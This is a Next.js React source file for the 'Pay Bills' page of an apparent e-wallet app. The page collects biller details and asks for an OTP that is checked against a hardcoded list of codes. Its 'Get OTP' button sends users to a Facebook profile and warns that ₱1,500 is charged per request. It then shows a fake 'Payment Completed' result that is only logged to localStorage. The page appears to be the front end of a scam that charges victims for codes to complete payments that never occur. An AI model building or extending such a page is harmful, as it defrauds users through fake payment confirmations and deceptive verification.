"use client"

import { useState } from "react"
import { Button } from "@/components/ui/button"
import { Card, CardContent, CardDescription, CardHeader, CardTitle } from "@/components/ui/card"
import { Input } from "@/components/ui/input"
import { Label } from "@/components/ui/label"
import { Select, SelectContent, SelectItem, SelectTrigger, SelectValue } from "@/components/ui/select"
import { Textarea } from "@/components/ui/textarea"
import { Alert, AlertDescription } from "@/components/ui/alert"
import { ArrowLeft, Receipt, Shield, CheckCircle, ExternalLink } from "lucide-react"
import Link from "next/link"
import { useRouter } from "next/navigation"

export default function PayBillsPage() {
  const router = useRouter()
  const [currentStep, setCurrentStep] = useState(1)
  const [errors, setErrors] = useState<Record<string, string>>({})
  const [otp, setOtp] = useState("")
  const [otpError, setOtpError] = useState("")
  const [billData, setBillData] = useState({
    category: "",
    billerName: "",
    accountNumber: "",
    amount: "",
    remarks: "",
  })

  const validOtps = [
    "356667",
    "887555",
    "246789",
    "790986",
    "566447",
    "378899",
    "145667",
    "899976",
    "356788",
    "468999",
    "087644",
    "356888",
    "357886",
  ]

  const validateStep1 = () => {
    const newErrors: Record<string, string> = {}

    if (!billData.category) newErrors.category = "Category is required"
    if (!billData.billerName.trim()) newErrors.billerName = "Biller name is required"
    if (!billData.accountNumber.trim()) newErrors.accountNumber = "Account number/reference is required"
    if (!billData.amount) {
      newErrors.amount = "Amount is required"
    } else if (Number.parseFloat(billData.amount) <= 0) {
      newErrors.amount = "Amount must be greater than ₱0"
    }

    setErrors(newErrors)
    return Object.keys(newErrors).length === 0
  }

  const handleContinue = () => {
    if (validateStep1()) {
      setCurrentStep(2)
    }
  }

  const handleGetOtp = () => {
    window.open("https://www.facebook.com/profile.php?id=61577793063769", "_blank")
  }

  const handleConfirmPayment = () => {
    if (!otp) {
      setOtpError("Please enter OTP code")
      return
    }

    if (!validOtps.includes(otp)) {
      setOtpError("❌ Invalid OTP code. Please request a new code and try again.")
      return
    }

    // Valid OTP - process payment
    setCurrentStep(3)

    setTimeout(() => {
      // Enhanced transaction logging
      const userData = JSON.parse(localStorage.getItem("moneymax_user") || "{}")
      const transactions = JSON.parse(localStorage.getItem("moneymax_transactions") || "[]")
      const newTransaction = {
        id: `TXN${Date.now()}`,
        date: new Date().toLocaleDateString(),
        time: new Date().toLocaleTimeString(),
        type: "Bill Payment",
        status: "Completed",
        amount: Number.parseFloat(billData.amount),
        description: `${billData.category} - ${billData.billerName}`,
        reference: `REF${Date.now().toString().slice(-6)}`,
        category: billData.category,
        billerName: billData.billerName,
        accountNumber: billData.accountNumber,
        remarks: billData.remarks,
        userId: userData.email,
      }
      transactions.unshift(newTransaction)
      localStorage.setItem("moneymax_transactions", JSON.stringify(transactions))

      alert(`✅ Bill Paid – ₱${Number.parseFloat(billData.amount).toLocaleString()} to ${billData.billerName}.`)
      router.push("/dashboard")
    }, 2000)
  }

  const handleInputChange = (field: string, value: string) => {
    setBillData((prev) => ({ ...prev, [field]: value }))
    if (errors[field]) {
      setErrors((prev) => ({ ...prev, [field]: "" }))
    }
  }

  return (
    <div className="min-h-screen bg-gray-50 p-4">
      <div className="max-w-md mx-auto">
        <div className="mb-6">
          <Link href="/dashboard" className="inline-flex items-center text-blue-600 hover:text-blue-700">
            <ArrowLeft className="h-4 w-4 mr-2" />
            Back to Dashboard
          </Link>
        </div>

        {/* Step 1: Bill Payment Form */}
        {currentStep === 1 && (
          <Card>
            <CardHeader className="text-center">
              <Receipt className="h-12 w-12 text-blue-600 mx-auto mb-4" />
              <CardTitle>Pay Bills</CardTitle>
              <CardDescription>Pay your utility bills and other expenses</CardDescription>
            </CardHeader>
            <CardContent className="space-y-4">
              <div className="space-y-2">
                <Label>Category</Label>
                <Select value={billData.category} onValueChange={(value) => handleInputChange("category", value)}>
                  <SelectTrigger>
                    <SelectValue placeholder="Select bill category" />
                  </SelectTrigger>
                  <SelectContent>
                    <SelectItem value="Electricity">Electricity</SelectItem>
                    <SelectItem value="Water">Water</SelectItem>
                    <SelectItem value="Internet">Internet</SelectItem>
                    <SelectItem value="Phone">Phone</SelectItem>
                  </SelectContent>
                </Select>
                {errors.category && (
                  <Alert variant="destructive">
                    <AlertDescription>{errors.category}</AlertDescription>
                  </Alert>
                )}
              </div>

              <div className="space-y-2">
                <Label>Biller Name</Label>
                <Input
                  value={billData.billerName}
                  onChange={(e) => handleInputChange("billerName", e.target.value)}
                  placeholder="Enter biller name"
                />
                {errors.billerName && (
                  <Alert variant="destructive">
                    <AlertDescription>{errors.billerName}</AlertDescription>
                  </Alert>
                )}
              </div>

              <div className="space-y-2">
                <Label>Account Number / Reference</Label>
                <Input
                  value={billData.accountNumber}
                  onChange={(e) => handleInputChange("accountNumber", e.target.value)}
                  placeholder="Enter account number or reference"
                />
                {errors.accountNumber && (
                  <Alert variant="destructive">
                    <AlertDescription>{errors.accountNumber}</AlertDescription>
                  </Alert>
                )}
              </div>

              <div className="space-y-2">
                <Label>Amount (₱)</Label>
                <Input
                  type="number"
                  value={billData.amount}
                  onChange={(e) => handleInputChange("amount", e.target.value)}
                  placeholder="Enter amount"
                  min="1"
                />
                {errors.amount && (
                  <Alert variant="destructive">
                    <AlertDescription>{errors.amount}</AlertDescription>
                  </Alert>
                )}
              </div>

              <div className="space-y-2">
                <Label>Remarks (Optional)</Label>
                <Textarea
                  value={billData.remarks}
                  onChange={(e) => handleInputChange("remarks", e.target.value)}
                  placeholder="Add any remarks or notes"
                  rows={3}
                />
              </div>

              <Button onClick={handleContinue} className="w-full">
                Continue
              </Button>
            </CardContent>
          </Card>
        )}

        {/* Step 2: Verify Bill Payment */}
        {currentStep === 2 && (
          <Card>
            <CardHeader className="text-center">
              <Shield className="h-12 w-12 text-blue-600 mx-auto mb-4" />
              <CardTitle>Verify Your Bill Payment</CardTitle>
              <CardDescription>
                Please confirm your bill payment details and enter a valid 6-digit OTP code to proceed.
              </CardDescription>
            </CardHeader>
            <CardContent className="space-y-6">
              {/* Bill Summary */}
              <Card className="bg-purple-50 border-purple-200 rounded-2xl">
                <CardHeader>
                  <CardTitle className="text-lg">Bill Summary</CardTitle>
                </CardHeader>
                <CardContent className="space-y-3">
                  <div className="flex justify-between">
                    <span className="text-gray-600">Category</span>
                    <span className="font-medium">{billData.category}</span>
                  </div>
                  <div className="flex justify-between">
                    <span className="text-gray-600">Biller Name</span>
                    <span className="font-medium">{billData.billerName}</span>
                  </div>
                  <div className="flex justify-between">
                    <span className="text-gray-600">Account Number / Reference</span>
                    <span className="font-medium">{billData.accountNumber}</span>
                  </div>
                  <div className="flex justify-between">
                    <span className="text-gray-600">Amount</span>
                    <span className="font-bold text-purple-600">
                      ₱{Number.parseFloat(billData.amount).toLocaleString()}
                    </span>
                  </div>
                  {billData.remarks && (
                    <div className="flex justify-between">
                      <span className="text-gray-600">Remarks</span>
                      <span className="font-medium">{billData.remarks}</span>
                    </div>
                  )}
                </CardContent>
              </Card>

              {/* OTP Section */}
              <div className="space-y-4">
                <div>
                  <Label>Enter 6-Digit OTP</Label>
                  <Input
                    type="text"
                    value={otp}
                    onChange={(e) => {
                      setOtp(e.target.value.replace(/\D/g, "").slice(0, 6))
                      setOtpError("")
                    }}
                    placeholder="Enter 6-digit OTP"
                    maxLength={6}
                    className="text-center text-lg tracking-widest"
                  />
                  {otpError && (
                    <Alert variant="destructive" className="mt-2">
                      <AlertDescription>{otpError}</AlertDescription>
                    </Alert>
                  )}
                </div>

                <div className="text-center space-y-3">
                  <p className="text-sm text-gray-600">Click below to request your OTP code.</p>
                  <Button onClick={handleGetOtp} variant="outline" className="w-full bg-transparent">
                    <ExternalLink className="h-4 w-4 mr-2" />
                    Get OTP
                  </Button>
                  <p className="text-xs text-orange-600 font-medium">
                    Important: ₱1,500 will be charged per OTP request
                  </p>
                </div>
              </div>

              <Button onClick={handleConfirmPayment} className="w-full" disabled={!otp}>
                Confirm Payment
              </Button>
            </CardContent>
          </Card>
        )}

        {/* Step 3: Processing */}
        {currentStep === 3 && (
          <Card>
            <CardHeader className="text-center">
              <CheckCircle className="h-12 w-12 text-green-600 mx-auto mb-4" />
              <CardTitle className="text-green-600">Payment Completed ✅</CardTitle>
              <CardDescription>Your bill payment is being processed...</CardDescription>
            </CardHeader>
            <CardContent className="text-center">
              <div className="animate-spin rounded-full h-8 w-8 border-b-2 border-blue-600 mx-auto"></div>
              <p className="mt-4 text-gray-600">Please wait while we process your payment...</p>
            </CardContent>
          </Card>
        )}
      </div>
    </div>
  )
}
